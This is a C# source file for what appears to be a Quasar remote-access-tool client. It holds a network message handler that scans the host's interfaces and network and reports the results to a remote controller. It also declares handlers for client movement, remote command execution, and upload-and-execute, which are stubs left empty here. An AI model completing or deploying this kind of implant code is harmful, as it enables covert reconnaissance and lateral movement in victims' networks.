using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.Helper;
using Quasar.Client.Helper.Network;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Common.Messages.Network;
using Quasar.Common.Models.Network;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class NetworkHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoNetworkScan ||
                                                    message is DoClientMovement ||
                                                    message is DoRemoteCommandExecute ||
                                                    message is DoUploadAndExecute ||
                                                    message is DoInterfaceScan;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoNetworkScan msg:
                    Execute(sender, msg);
                    break;
                case DoClientMovement msg:
                    Execute(sender, msg);
                    break;
                case DoRemoteCommandExecute msg:
                    Execute(sender, msg);
                    break;
                case DoUploadAndExecute msg:
                    Execute(sender, msg);
                    break;
                case DoInterfaceScan msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoNetworkScan message)
        {
            Task.Run(() =>
            {
                ScannerHelper.ScanInterfaceAction(message.nic,
                (packet) =>
                {
                    client.Send(packet);
                },
                (packet) =>
                {
                    //Dont forget, targetInterfaceIndex is actually targetInterfaceIndex + 1
                    client.Send(packet);
                });
                client.Send(new DoNetworkScanProgress { Addresses = 0 }); // Complete
            });
        }

        private void Execute(ISender client, DoInterfaceScan message)
        {
            List<InterfaceEntity> interfaces = ScannerHelper.GetInterfaces();
            List<int> potentialIps = new List<int>();
            foreach (InterfaceEntity nic in interfaces)
            {
                int ipCount = ScannerHelper.CalculateTotalPotentialIPs(nic);
                potentialIps.Add(ipCount);
            }
            DoInterfaceScanResponse response = new DoInterfaceScanResponse { Interfaces = interfaces.ToArray(), PotentialIps = potentialIps.ToArray() };
            client.Send(response);
        }

        private void Execute(ISender client, DoClientMovement message)
        {
            MessageBox.Show("Client Movement Requested!");
        }

        private void Execute(ISender client, DoRemoteCommandExecute message)
        {

        }

        private void Execute(ISender client, DoUploadAndExecute message)
        {

        }
    }
}
